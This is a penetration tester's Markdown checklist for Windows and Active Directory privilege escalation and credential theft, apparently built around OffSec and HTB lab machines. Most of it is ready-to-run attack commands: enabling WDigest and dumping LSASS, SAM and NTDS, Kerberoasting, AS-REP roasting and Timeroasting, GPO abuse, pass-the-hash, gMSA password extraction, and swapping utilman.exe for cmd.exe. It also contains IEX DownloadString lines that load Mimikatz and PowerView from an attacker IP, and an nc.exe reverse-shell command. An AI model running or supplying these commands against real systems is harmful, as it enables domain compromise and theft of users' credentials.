##### 🖥️ System Information
- [ ] `systeminfo` this will list the value of `Domain:` for the domain
- [ ] `whoami /all` 
  - [ ] maybe have to run: `C:\windows\system32\whoami.exe`
	- [ ] `SeImpersonatePrivilege`
	- [ ] Use `PrintSpoofer` or `GodPotato`
	- [ ] If not try `SweetPotato.exe` (Sharp Collection)
- [ ] `hostname`  Any prefix will be the Machine name or the name of the Domain nad the user is a domain user too.
- [ ] `C:> set`      get all the Env vars
- [ ] `PS:> Get-ChildItem Env: | ft Key,Value`  - Get the env vars Tidy


##### Check all users Console History

- [ ] `C:>` List out all the files
```
for /f "delims=" %A in ('dir /s /b /a:-d C:\ConsoleHost_history.txt 2^>nul') do @echo %A
```

- [ ] `P:>` Find the files and print the content
```
Get-ChildItem -Path C:\Users\ -Recurse -Force -Filter "ConsoleHost_history.txt" -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Output "`n--- $($_.FullName) ---"
    Get-Content $_.FullName
}
```

## --- (⚠️ !!! RUN BLOODHOUND !!!) ---


---

## ⚠️ Token Impersonation  eg ( PrintSpoofer, Rogue-Potato)

Other privileges that may lead to privilege escalation are:
- `SeBackupPrivilege`
- `SeAssignPrimaryToken`
- `SeLoadDriver`
- `SeDebug`
	- [ ] `SeImpersonatePrivilege`
	- [ ] Use `PrintSpoofer` or `GodPotato`
	- [ ] If not try `SweetPotato.exe` (Sharp Collection)

- Sirens List of exploits: https://sirensecurity.io/blog/windows-privilege-escalation-resources/
- Toekn Priv esc here - https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html

---

### WINDOWS PRIVESC: SePrivilege Reference  

| Privilege Name | Box | Binary | GitHub PoC |
|---|---|---|---|
| SeDebugPrivilege | Osaka | | github.com/bruno-1337/SeDebugPrivilege |
| SeImpersonatePrivilege | | GodPotato, PrintSpoofer | github.com/itm4n/PrintSpoofer |
| SeAssignPrimaryToken | | | github.com/b4rdia/HackTricks |
| SeTcbPrivilege | | | github.com/hatRiot/token-priv |
| SeCreateTokenPrivilege | | | github.com/hatRiot/token-priv |
| SeLoadDriverPrivilege | Osaka | | github.com/k4sth4/SeLoadDriverPrivilege |
| SeTakeOwnershipPrivilege | | | github.com/hatRiot/token-priv |
| SeRestorePrivilege | Heist | utilman.exe | github.com/xct/SeRestoreAbuse |
| SeBackupPrivilege | | | github.com/k4sth4/SeBackupPrivilege |
| SeIncreaseQuotaPrivilege | | | github.com/b4rdia/HackTricks |
| SeSystemEnvironment | | | github.com/b4rdia/HackTricks |
| SeMachineAccount | | | github.com/b4rdia/HackTricks |
| SeTrustedCredManAccess | | | learn.microsoft.com/trusted-caller |
| SeRelabelPrivilege | | | github.com/decoder-it/RelabelAbuse |
| SeManageVolumePrivilege | Access | WerTrigger.exe | github.com/CsEnox/SeManageVolumeExploit |
| SeManageVolumePrivilege (alt) | | | github.com/sailay1996/WerTrigger |
| SeCreateGlobalPrivilege | | | github.com/b4rdia/HackTricks |
| SeTcbPrivilege (alt) | | | github.com/CharminDoge/tcb-lpe |
| SeTcbPrivilege (local) | | SeTcbPrivilege.exe | See local copy |



- Also a **GREAT** repo of [Windows Privlige Vectors ](https://github.com/gtworek/Priv2Admin)
- And the hack tricks list : https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation



## ⚠️ SeRestorePrivilege PrivEsc
Run [this script](https://github.com/JunglistHyperD/TestingMethodologies/blob/main/Windows/ActiveDirectory/TokenTools/SeRestorePrivilege/EnableSeRestorePRivlege.ps1) to restore, or this one [SeRestore](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) - SeRestorePrivilege
```
./EnableSeRestorePrivilege.ps1
```
1. Backup ( in case) and then Swap SYSTEM level **utilman.exe** with **cmd.exe**
2. P:> `move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old`
1. P:> `move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe`
2. Login to host via rdp - `rdesktop 192.168.102.227` as this will restart the `utilman.exe`  
3. At the GUI get a system shell spawn, either by clicking _Ease of access_ or press `WIN + U` and a


## ⚠️ SeManageVolumePrivilege PrivEsc
Follow the steps here - https://github.com/sailay1996/WerTrigger 

with :
`phoneinfo.dll` ,  `Report.wer`  and `WerTrigger.exe`


<hr style="border: 4px solid black;">


## **Powershell History**
- [ ] `Get-History`
- [ ] `(Get-PSReadlineOption).HistorySavePath`
- [ ] `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- [ ] `reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"` — Quieter software check
- [ ] `wmic service get name,pathname,startmode `— Look for vulnerable services
- [ ] `wmic product get name,version `— Installed software (very noisy, but useful)



## 👥 Users and Groups
- [ ] `PS:> qwinsta` - Check who else is logged on to the machine
- [ ] `net users` Get the local users:  
- [ ] `net users /domain` Get the domain users: 
- [ ] `net user USERNAME`
	- logon scrips ? 
	- Password last set
- [ ] `net user /domain <USERNAME>` - Get details on specific user
- [ ] `net groups` # AD ONLY
- [ ] `net localgroup` Get the groups: 
- [ ] `net group /domain` Get the groups in the domain: 
- [ ] `net localgroup "Domain Admins"` See the the domain admins: 
- [ ] `net group "Domain Admins" /domain` Enumerate the domain admins: (WONT SHOW NESTED GROUPS) eg “Enterprise Admins”, “Administrators”, “Server Operators”, etc.)
- [ ] Note any non-default groups that might have elevated rights (e.g. custom IT groups).

## 🌐 Networks
[Fping](https://fping.org/) to see what is on the network
```
fping -asgq 172.16.139.0/23 | tee hosts.txt
```
 - `a` to show targets that are alive, 
 - `s` to print stats at the end of the scan, 
 - `g` to generate a target list from the CIDR network,
 - `q` to not show per-target results.

- [ ] `ipconfig /all`  Get the interfaces
- [ ] `arp -a` - List which other hosts are cached and known to this machine
- [ ] `route print` - list which network connections are known to our machine
- [ ] `netstat -ano`  - Get all active connections
- [ ] `net use` — Active network shares
- [ ] `net view \\<hostname>` — Check shared folders (when reachable)
- [ ] Try to get a null session from Windows (**LOCAL**)

```
net use \\DC01\ipc$ "" /u:""
```

- [ ] See what kind of error we get from things like the below ( Disabled, Incorrect, Locked)
```
net use \\DC01\ipc$ "" /u:guest
```


## 🔥 FireWall
- [ ] `netsh advfirewall firewall show rule name=all` - Check the firewall rules
- [ ] `netsh advfirewall firewall show rule dir=in name=all` - Check the inbound firewall rules
- [ ]  `netsh advfirewall firewall show rule dir=out name=all` - Check the outbound firewall rules
- [ ] `PS:> Get-NetFirewallRule | Where-Object { $_.Group -ne "" -or $_.DisplayName -notmatch "Windows Defender" } | Format-Table Name, DisplayName, Enabled, Direction, Action, Profile` - Potential Search for custom FW rules


## 📂 Files
- [ ] `PC:> dir /a /o /q` - Get the full list of files
- [ ] `gci -force`   - Get all the files inc hidden - ippsec way
- [ ]  Check both `\Program Files\` for any interesting software eg **LAPS**
- [ ] `findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml`  -- START like this and keep it simple , then look for txt etc/ **Remove `M` to see lines** ( OFFSEC PG : Mice ) 
- [ ] `dir /s *pass* == *cred* == *.config*`

##  Services
- [ ] `tasklist /SVC`   - Will show services/ Low priv users cannot see if Admins are runign higher level Services

## Logs and audits
Check Member of the "Event Log Readers". See what powershell commands etc have bee nrun especially and Base64 blobs
- [ ] `Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt`  - Offsec PG: Comprimised

- [ ] `nltest /dclist:<bossingit.biz_NAME>` list DC and check env var `LOGONSERVER` . Note the DC hostnames/IPs for targeting.

- [ ] `PS:>` Powershell [language mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) - Contrained or full? 
```
$ExecutionContext.SessionState.LanguageMode
```

## Get the password policy 
- [ ] With NXC
```
nxc smb 192.168.102.227 --pass-pol
```
- [ ] Record the data of the users ( Be caful not overdoing BF !! )
```
sudo crackmapexec smb 192.168.102.227 -u 'Quotes' -p 'Quotesaswell' --users | tee  usernames.txt
```

- [ ] Or rpcclient
```
rpcclient -U "" -N 192.168.102.227
```
- [ ] Then `querydominfo`
- [ ] Then `getdompwinfo`
- [ ] Then `enumdomusers`

- [ ] Alt with Enum4Lin-ng
```
enum4linux-ng -P 192.168.102.227 -oA E4L-ng_DomainReport.txt
```
- [ ] Aldt with `ldapsearch`
```
ldapsearch -h 192.168.102.227 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
- [ ] alt native windows without tools 
```
net accounts
```
- [ ] With `PV:>`
```
Get-DomainPolicy
```

## Get Some tools ...
- [ ] `PS:>` Get Powerview and Invoke (AMSI might detect this, if so search for Matt Grabers version) . `PV:>` == Powerview CMd
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.202:80/powerview.ps1')
```

- [ ] `PS> Get Invk-K8t.ps1`
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.202:80/Invoke-Kerberoast.ps1') 
```

- [ ] `PS:>` Get Invoke-Mimikatz
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.202:80/Invoke-Mimikatz.ps1')
```

- [ ] `PS:> adPEAS.ps1` - https://github.com/61106960/adPEAS - **Get Powerview First**
Start adPEAS with all enumeration modules and enumerate the domain 'contoso.com'. In addition it writes all output without any ANSI color codes to a file.

```
Invoke-adPEAS -Domain 'contoso.com' -Outputfile 'C:\temp\adPEAS_outputfile' -NoColor
```

### Nice TOOLS if you can run them ...
#### Listen for Hashes (whilst you look around) 
- [ ] `Ex or PS:>`- Use Inveigh or Responder 
```
.\Inveigh.exe
```
or 
```
Invoke-Inveigh -NBNS Y LLMNR Y -ConsoleOutput Y -FileOutput Y
```
(hashcat hash type might be `5600`)
or 
```
Invoke-Inveigh -IP 172.16.139.240 -LLMNR Y -NBNS Y -mDNS Y -DNS Y -HTTP Y -Proxy Y -WPADResponse Y -HTTPAuth NTLM -WPADAuth NTLM -ProxyAuth NTLM -ConsoleOutput Y -FileOutput Y -ConsoleUnique N -FileUnique N
Invoke-Inveigh -IP <AD_ATAX_SPOOF_IP> -LLMNR Y -NBNS Y -mDNS Y -DNS Y -HTTP Y -Proxy Y -WPADResponse Y -HTTPAuth NTLM -WPADAuth NTLM -ProxyAuth NTLM -ConsoleOutput Y -FileOutput Y -ConsoleUnique N -FileUnique N
```

[ADRecon](https://github.com/adrecon/ADRecon/blob/master/ADRecon.ps1) - where stealth is not required,
```
 Import-Module .\ADRecon\ADRecon.ps1
```

[Pingcastle](https://www.pingcastle.com/documentation/) -  evaluates the security posture of an AD environment
```
PingCastle.exe
```
[Group3r](https://github.com/Group3r/Group3r)-  Group policy Audit
```
group3r.exe -f <filepath-name.log>
```
## On Every Machine run...
- [ ] `PV:>` See who is logged on right now (so you dont brick their session)
```
Get-NetSession
```

##  Get the users

- [ ] `PV:>`
```
Get-DomainUser | select name , memberof
```

- [ ] `PV:>`
```
Get-DomainUser | select samaccountname, userprincipalname, enabled, lastlogon
```
- [ ] With kerbrute - enum for usernames
```
kerbrute userenum -d <bossingit.biz> --dc 192.168.102.227 /opt/jsmith.txt 
```
  - [ ] IF we have valid credentials 
```
sudo nxc smb DC_192.168.102.227 -u <USER> -p <PASSWORD> --users
```

##### If the AD module can be loaded 
- [ ] `AD_Module:>` Create a file of all the users in the domain
```
Import-Module ActiveDirectory 
```

```
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```


## Domain-Joined Computers (Workstations, Servers, DCs)
- [ ] `PV:>`
```
Get-NetComputer * | select Name, OperatingSystem, Enabled
```
- [ ] `C:>` Native (DCs)
```
nltest /dclist:<domain>
```
- [ ] `K:>` - Impacket (Linux)
```
Impacket-GetADComputers -dc-ip <DC-IP> <domain>/<user>:<pass>
```

### Get the bossingit.biz Admins and the DC details 
- [ ] `PV:>` Get all the Domains Admins and all the Machines from the domain controller (runs things like Get-NetSession and Get-NetLoggedon )
```
Invoke-UserHunter
```

```
Invoke-UserHunter -CheckAccess
```

### Domain Admins and their Groups ; Recursively 
- [ ] `PV:>` 
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
- [ ] `PVa:>` Dump hashes?? - Recently logged in users (and so would have their hash logged to) ( Cmd requiers admin privs so if it works you know you are L-Admin)
```
Get-NetLoggedon | select UserName
```

### List hosts and OS versions of DCs, file servers, etc. for potential pivot targets.
- [ ] `PV:>`:  
```
Get-NetComputer -fulldata | select Name,OperatingSystem
```
For each important server (e.g. DC or file server), list shares
```
net view \\<ServerName>
``` 

- [ ] Check the `SYSVOL` and `NETLOGON` shares on DCs (available to Authenticated Users by default).
- [ ] Look for Group Policy files: e.g. `\\<DC>\SYSVOL\<domain>\Policies\... (search for “Groups.xml” containing cpasswor`
- [ ] Search files 
```
findstr /SIM "password" *.txt *.xml *.config
```


### Key AD Services (Kerberos, LDAP, DNS, NetBIOS)
```
nmap -sV -p 53,88,135,139,389,445,636,3268,3269 <target>
```
- [ ] `C:>` Windows Quick Check
```
telnet <DC-IP> 389
```

### Find SPNs
- [ ] `PV:>` Get the Service Principle Names
```
Get-NetUser -SPN | select cn,samaccountname,serviceprincipalname
```

- [ ] find all SPNs : Native
```
setspn -T <bossingit.biz_NAME> -Q */*
```
 - [ ] `PV:>`
```
Get-NetUser -SPN
```
Note any service accounts (e.g. SQL, IIS, Exchange) and their usernames for potential
Kerberoasting

### Check Machines for Admin Accecs
- [ ] `PV:>` List all computers and then check for admin access of current user on each
```
Get-NetComputer| ForEach-Object { if (Test-AdminAccess -ComputerName $_.Name) { $_.Name } }
```

#### Get the domain admin usernames
- [ ] `PV:>` 
```
Get-DomainGroupMember -Identity "Domain Admins" -Recurse | Select-Object -Property MemberName
```

### Resolve DNS names with creds ( [adidnsdump](https://github.com/dirkjanm/adidnsdump))
- [ ] `K:>` run once to get Records
```
sudo adidnsdump -u inlanefreight\\forend ldap://172.16.139.5 
```
- [ ] `K:>` Run again recursivly on the results
```
sudo adidnsdump -u inlanefreight\\forend ldap://172.16.139.5 -r
```

### Passwords left in descriptions
- [ ] `PV:>` Any passswords left in descriptions? 
```
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

### password policy not required for some users
- [ ] `PV:>` Chck for user s who dont need the PW policy and may have shorter or Null passwords
```
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

---
<hr style="border: 4px solid black;">

---


# Attacking 

### ⚠️ Misconfigured GPO's (`Group Policy Objects`)
(Offsec Vault)

- [ ] `PV:>` 1. Check Current Users Group Policy Permissions
```
Get-NetGPO
```
- [ ] `PV:>` 2. With name value of the GPO (usually a SID looking value) , check Permissions
```
Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName mario
```

- [ ] 3. If the Policy permits it, Add to local Admins with this tool
```
./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount USERNAME --GPOName "Default Domain Policy"
```
- [ ] 4. update the Policty 
```
gpupdate /force
```
- [ ] 5. PSEXEC to the Target for an Admin session
```
impacket-psexec vault.offsec/mario:SecureHM@192.168.179.116
```


#### Alt Attack

- [ ] Initial Check against all Domain Users (Everyone)
```
$sid=Convert-NameToSid "Domain Users"
```
- [ ] `PV:>` Check all Users 
```
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
- [ ] Convert Resulting GUID to the name 
```
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532              
```


### ⚠️ Credential Access (Obtaining Credentials & Hashes)

To dump the LSASS from memory check it is set 
```
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" | Select-Object UseLogonCredential
```
- [ ] if not set , set it to 1 and verifiy it is now set
```
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 1
```

- [ ] Analyse off-box with Mimikatz:
```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit" > MimiDump.txt
```  
• Captures clear-text creds, NTLM hashes, Kerberos tickets of logged-in users.

- [ ] ⚠️ **Mimikatz (LSASS Dump)** – live memory credential harvest (requires local admin) If AV touchy, and local admin ; first dump process:
```cmd
procdump -ma lsass.exe lsass.dmp
```

- [ ] ⚠️**Windows Credential Manager & Saved Secrets**  
```
cmdkey /list
```  
• Re-use with `runas /savecred` or map SMB sessions.

- [ ] ⚠️ **SAM & LSA Secrets** – local hashes / secrets (workstations & servers)  
```
reg save HKLM\SAM sam.save
```

```
reg save HKLM\SYSTEM system.save
```

```
reg save HKLM\SECURITY sec.save
```

```
secretsdump.py -sam sam.save -system system.save -security sec.save LOCAL
```  
• Crack local-admin passwords; look for reuse across machines.

- [ ] ⚠️**Check for Cached Domain Credentials** (Windows DPAPI cache)  
    ```text
    mimikatz lsadump::cache
    ```  
    • Recovered NTLM hashes usable for pass-the-hash.

- [ ] ⚠️**Looting Files for Creds**  
	- [ ] `PS:>`
```
Select-String -Path C:\* -Pattern "password" -SimpleMatch -ErrorAction SilentlyContinue
```

- [ ] `C:>` 
```   
findstr /ism "password" *.config *.xml *.txt *.ps1 *.bat
```

• Check `C:\Users\*`, web.configs, database connection strings, scripts, RDP files.  

- [ ] **Group Policy Preference (GPP) Passwords**  
    1️⃣ Locate `Groups.xml`, `Services.xml`, etc. in `\\<bossingit.biz>\SYSVOL\`.  
    2️⃣ Decrypt the `<cpassword>` value with published AES key (PowerShell or OpenSSL one-liner).
    - OR `gpp-decrypt -f Groups.xml` like in htb Active

- [ ] **Domain Controller Harvest (NTDS Dump)** – *only if* SYSTEM/DA rights on DC  
    - [ ] 1️Create VSS shadow & copy:  
```cmd
    vssadmin create shadow /for=C:
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit .
    copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
```  
    - [ ] Extract hashes:  
```
secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
   • Store resulting hashes for full offline crack or proof of domain compromise.


#### ⚠️ Relay a victim hash back to attacker via an updated DNS record

`dnstool.py` is a script that comes with [Krbrelayx](https://github.com/dirkjanm/krbrelayx) that can: **Add/modify/delete Active Directory Integrated DNS records via LDAP.**

This command will add an additiaonal domain name record of our hacker machine so we can lsiten with Responder and get hashes. add the dns record of `nasty.bossingit.biz.offsec`

```
python3 dnstool.py -u bossingit.biz\\COMPRMSD_USER -p COMPRMSD_PW --action add --record nasty --data 192.168.45.202 -dns-ip IP_TARGET --type A bossingit.biz.offsec
```



--- 

#### DPAPI Common Locations 

First see Dedicated Checeklist Template file on DPAPI decryption with impacket

```
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\      # DPAPI master keys:
C:\Users\<user>\AppData\Local\Microsoft\Credentials\          # DPAPI credentials:
```
This tool will dump the stored credentails includieng DPAPI ( HTB Vintage) - https://github.com/peewpw/Invoke-WCMDump
```
.\Invoke-WCMDump.ps1          
```

<hr style="border: 4px solid black;">

# 🔥Roasting🔥

## ⚠️🔥**Kerberoasting**🔥 – dump service-account hashes from SPN tickets  

Anonymous ldap Bind without creds
```
impacket-GetNPUsers bossingit.biz/ -dc-ip 192.168.102.227 -no-pass | tee kerberoast-raw-output.txt
```
If usernames only
```
impacket-GetUserSPNs bossingit.biz/ -usersfile users.txt -dc-ip 192.168.102.227 -no-pass | tee kerberoast-raw-output.txt
```

Prerequisite to Kerberoasting is either 
- domain user credentials (cleartext or just an NTLM hash if using Impacket) 
- a shell in the context of a domain user, or account such as SYSTEM. 
- know Domain Controller IP so we can query it.

```
Rubeus.exe kerberoast /outfile:hashes.kerb
```

If we need to check all users to target the DA's :
```
impacket-GetUserSPNs -dc-ip <DC-IP> corp.com/USERNAME
```
Then request all the hashes we can get and crack the high value targets:
```
impacket-GetUserSPNs -request -dc-ip <DC-IP> corp.com/USERNAME -outputfile kROAST_output_tgs
```
   • Crack offline with **Hashcat** (`-m 13100`).  `hashcat -m 3100 kROAST_output_tgs /usr/share/wordlists/rockyou.txt`
   • If cracked password is privileged, jump to Priv-Esc section.

Or request a specific user:
```
impacket-GetUserSPNs -request -dc-ip <DC-IP> corp.com/USERNAME -request-user TARGET -outputfile TARGET_tgs
```

#### Windows-Based Kerberoasting – Essentials
- [ ] Using Rubeus (most direct method):
```
Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
- [ ] With Mimikatz (less common):
```
kerberos::list /export
```
- [ ] PowerView alternative (for finding SPNs):
```
Get-NetUser -SPN | select cn,samaccountname,serviceprincipalname
```
- [ ] PowerView to request a ticket:
```
Get-DomainSPNTicket -OutputFormat Hashcat | Out-File hashes.kerberoast
```

##### Targeted Kerberoasting

Tool for Targeted Kerberoasting - https://github.com/ShutdownRepo/targetedKerberoast
```
python3 targetetedkerberoast.py -v -d administartor.htb -u '<CONTROLLED_USERNAME>' -p 'PASSWORD'        # Targeted Kerberoast - (Can get a clock Skew error - fix in notes) 
```

**Targetd Kerberoasting on a disabled sql_svc account**

First we need a tgt 

```
impacket-getTGT 'vintage.htb/gmsa01$' -dc-ip 10.129.231.205  -hashes ':6fa8a70cfb333b7f68e3f0d94b247f68'
```

```
export KRB5CCNAME=gmsa01$.ccache
```
Re-enable `svc_sql` acc
```
bloodyAD -d vintage.htb -u 'gmsa01$' -p '6fa8a70cfb333b7f68e3f0d94b247f68' -f rc4 --host dc01.vintage.htb -k remove uac svc_sql -f ACCOUNTDISABLE
```

Example to add a SPN to an account for roasting
```
bloodyAD -d vintage.htb -u 'gmsa01$' -p '6fa8a70cfb333b7f68e3f0d94b247f68' -f rc4 --host dc01.vintage.htb -k set object svc_sql servicePrincipalName -v 'http/sql'
```
Targeted KErberoas useing Krb AuthN
```
python3 targetetedkerberoast.py -v -d vintage.htb -k -no-pass --dc-hosts dc.vintage.htb
```
Often will autodetect
```
hashcat hashes.hash wordlist.txt 
```


## ⚠️🔥**AS-REP Roasting**🔥 – request hashes for users without pre-auth  

With impacket first (NP == NoPreAuthN)
```
impacket-GetNPUsers bossingit.biz/ -usersfile users.txt -dc-ip 192.168.102.227 -no-pass 2>&1 | tee asrep-raw-output.txt
```

Maybe then [nxc](https://www.netexec.wiki/ldap-protocol/asreproast)  - (password??)
```
nxc ldap 192.168.102.227 -u '' -p '' --asreproast Hashes-OUT.txt
```

```
Rubeus.exe asreproast /nowrap /format:hashcat
```

```
impacket-GetNPUsers corp.com/ -dc-ip <DC-IP>
```  
• Crack with **Hashcat** (mode 18200) to obtain plaintext passwords.

PowerView: 
```
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
(or Get-ASREPPolicy in some toolsets) to list such accounts.
```
Get-DomainUser -PreauthNotRequired | select name
```

- [ ] `K:>` With a list of of user names look for AS-REP vuln accounts or with `pete`
```
impacket-GetNPUsers -no-pass -usersfile users.txt -dc-ip bossingit.biz_C_IP -request -outputfile hashes.asreproast corp.com/pete
```

- [ ] `K:>` Without any usernames look for AS-REP vuln accounts
```
impacket-GetNPUsers -dc-ip bossingit.biz_C_IP -request -outputfile hashes.asreproast corp.com/
```


-------

With each newly discoverd user run 

```
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

### Bruteforce with usernames

We can then take the usernames and BRuteforce on AS-REProast ( this is nte beset wauy I know for this at momment ( better then all other tools))
```
for user in $(cat usernames.txt); do impacket-GetNPUsers -no-pass -dc-ip 192.168.102.227 bossingit.biz.offsec/$user | grep krb5asrep; done
```

## ⚠️🔥TimeRoasting - ntp (udp:123) hash leak 

[TimeRoasting](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac) relies on [MS-SNTP](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sntp/8106cb73-ab3a-4542-8bc8-784dd32031cc), MS extension to the NTP and SNTP protocols used by domain joined hosts to synchronize time with a domain controller. Syncing ntp to the DC will bleed `sntp` hashes of users which can be cracked with hashcat mode `31300` currently only in locally compiled or beta versions.

ntp is often running on UDP port 123
```
sudo nmap -sU -p 123 -sV 192.168.102.227
```

Simple nxc implementation of TImeroasting 
```
nxc smb 192.168.102.227 -u 'USERNAME' -p 'PASSWORD' -M timeroast 
```

Alt Tool https://github.com/SecuraBV/Timeroast

```
python3 timeroast.py 10.129.232.127                 
```
**Cracking** 
- https://hashcat.net/beta/
From within the unziped gcc version
```
 ./hashcat.bin -a 0 -m 31300 ntp-hashes.hash /usr/share/wordlists/rockyou.txt   
```


# ⚠️  Offline HASH Cracking
### See `hashcat`, `john`

# HASH REUSE BASED Access
##  ⚠️ Pass the hash
Requirements requires:
✅ The target machine must be accessible over SMB (port 445)
✅ Windows File and Printer Sharing must be enabled (typically default in domain environments)
✅ An admin share (like ADMIN$) must be available
✅ Admin rights on the target machine

- [ ] With **wmiexec**
```
impacket-wmiexec -hashes :<NTLM-HASH> <bossingit.biz>/<USER>@<IP>
```
- [ ] with **PSexec**
```
impacket-psexec -hashes :<NTLM-HASH> <bossingit.biz>/<USER>@<IP>
```
- [ ] with **nxc**
```
nxc smb <IP> -u <user> -H <NTLM-HASH> --exec 'whoami'
```
- eveil-Winrm
```
evil-winrm -i <TARGET> -u <USERNAME> -H '<HASH>'
```
## ⚠️ Over Pass the Hash
An attacker can use an NTLM hash of a domain account to forge a Kerberos TGT and act as that user without knowing the password.

 ✅ Preconditions for Over-Pass-the-Hash (OPtH)
- [ ] You have a **domain user's NTLM hash**
- [ ] You have **local administrator** access on the attack box
- [ ] You can **communicate with the Domain Controller** (Kerberos ports open)
- [ ] The account is **active and not restricted**

- [ ] `PS:>` With Mimikatz
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::pth /user:<LOCAL_ADMIN_USER> /domain:<bossingit.biz> /ntlm:<NTLM_HASH> /run:powershell.exe" "exit"' 
```
- [ ] `EXE:>` With Mimikatz
```
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<LOCAL_ADMIN_USER> /domain:<bossingit.biz> /ntlm:<NTLM_HASH> /run:powershell.exe" "exit"
```

---

## ⚠️ gMSA Permission leading to password reveal

A gMSA is a special type of service account in Active Directory designed to automatically manage and periodically rotate its password. These accounts are commonly used to run services securely without the need for manual password management. Never meant to be known by humans. Access to the gMSA’s managed password is restricted to specific users or groups via the `PrincipalsAllowedToRetrieveManagedPassword` property.

Might need
```
Import-Module ActiveDirectory
```

- [ ] 1 - Look up the `PrincipalsAllowedToRetrieveManagedPassword` user property on the account.
```
Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword
```

- [ ] 2 - Permissions to get the password hash? 
```
Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
```

- [ ] 3 - If we can install `DSInternals`, we can do it from the box
```
Import-Module DSInternals
```

```
wget -O DSInternals.zip $(curl -s https://api.github.com/repos/MichaelGrafnetter/DSInternals/releases/latest | grep "browser_download_url" | grep ".zip" | cut -d '"' -f 4)
```

```
Get-ADServiceAccount -Identity svc_apache$ -Properties msDS-ManagedPassword | Select -Expand msDS-ManagedPassword | ConvertFrom-ADManagedPasswordBlob
```

- [ ] 4 - Else this tool loaded on might help
### From Windows ( on the box)
```
./GMSAPasswordReader.exe --accountname svc_apache
```
- [ ] 5 - Else remotely fro mour attacking machine
### From Linux  (Local Hacking)

```
nxc ldap 192.168.102.227 -k -u 'USERNAME' -p 'PASSWORD' --gmsa
```
The above is harded coded for 3899 , which might not be the right port. Might be able ot edit the port detials in : `/usr/lib/python3/dist-packages/impacket/ldap/ldap.py`


Get gmsa of a PRe-Windows 2000 machone ( often with the password as the name without the trailinbg `$`).
```
netexec ldap vintage.htb -u 'FS01$' -p fs01 -k --gmsa
```

```
bloodyAD --host dc01.heist.offsec -d heist.offsec -u enox -p california get object svc_apache$ --attr msDS-ManagedPassword
```

```
bloodyAD -d vintage.htb -u 'fs01$' -p 'fs01' --host dc01.vintage.htb -k get object 'gmsa01$' --attr msDS-ManagedPassword
```

**Other BloodyAd Commands** - Unrelated

Remove the Flag ACCOUNTDISABLE (enable the account) (HTB Puppy)
```
bloodyAD --host 10.129.101.76 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
```
Set Adamas password (HTB Puppy)
```
bloodyAD --host 10.129.101.76 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'Tuesday@2'     
```

#### Dump gMSAA hashes (if we have permission)

```
python3 /home/kali/Tools/ImmidiateTools/gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intellignece.htb'
```

---

- [ ] `C:>` Run as in cmd prompt I think
```
runas /netonly /user:active.htb\svc_tgs cmd
```

- [ ] `P:>` After importing , Can run as
```
Invoke-RunasCs svc_mssql PASSWORD "cmd /c C:\xampp\htdocs\uploads\nc.exe -e cmd.exe 192.168.45.227 53"
```
---


# Ticket Resuse 

## ⚠️ Pass-the-Ticket (PtT)
**PtT** – reuse of extracted Kerberos tickets (typically `.kirbi` files) to impersonate a user or access specific services without needing their password or hash. Only works within the scope of the services for which the ticket was issued.

- [ ] **0.** Confirm you *do not already* have access to the target resource
```powershell
ls \\<TARGET_MACHINE>\<SHARE>
```
- [ ] **1.** Export Kerberos tickets from memory using Mimikatz
**With Invoke-Mimikatz.ps1:**
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::tickets /export"'
```
**With mimikatz.exe:**
